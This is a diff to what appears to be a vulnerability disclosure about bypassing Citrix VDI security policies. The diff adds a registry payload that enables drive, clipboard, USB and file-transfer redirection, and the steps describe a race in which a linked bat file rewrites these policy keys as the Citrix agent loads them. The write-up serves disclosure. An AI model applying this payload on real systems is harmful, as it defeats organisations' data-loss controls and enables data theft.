@@ -15,6 +15,39 @@ An attacker can bypass the Drive, Network, Clipboard, etc. security policies iss
 ## POC  
 1. The attacker logs into VDI and executes a Bat file ([https://windshock.github.io/bypass.zip](https://windshock.github.io/bypass.zip)) that continuously modifies the registry. Then, they close the VDI connection.  
   
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\CdmPolicies]
+"AutoConnectDrives"=dword:00000001
+"AllowCdromDrives"=dword:00000001
+"AllowFixedDrives"=dword:00000001
+"AllowFloppyDrives"=dword:00000001
+"AllowNetworkDrives"=dword:00000001
+"AllowRemoveableDrives"=dword:00000001
+"UseAsyncWrites"=dword:00000001
+"ReadOnlyMappedDrive"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\IO]
+"AutoConnectClientLptPorts"=dword:00000001
+"TryMapToClientDriveLetter"=dword:00000001
+"AllowFileTransfer"=dword:00000001
+"AllowFileUpload"=dword:00000001
+"AllowFileDownload"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\VCPolicies]
+"AllowComPortRedirection"=dword:00000001
+"AllowDriveRedir"=dword:00000001
+"AllowLptPortRedirection"=dword:00000001
+"AllowPrinterRedir"=dword:00000001
+"AllowClipboardRedir"=dword:00000001
+"ReadonlyClipboard"=dword:00000001
+"AllowUSBRedir"=dword:00000001
+"RestrictSessionClipboardWrite"=dword:00000000
+"RestrictClientClipboardWrite"=dword:00000000
+
+
 2. When the attacker logs back into VDI, PicaSvc2.exe communicates with the Citrix server to receive policies and records the corresponding policies in the registry.  
   
 3. While PicaSvc2.exe records and reads the policies, the registry's policy values are tampered with by the Bat file previously executed by the attacker.  
@@ -36,5 +69,5 @@ Check the registry that the citrix agent uses to store policy settings.
 View and manipulate the contents of that registry.
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTY1MDg1OTEzMV19
+eyJoaXN0b3J5IjpbMTg3ODEyNDM0OF19
 -->
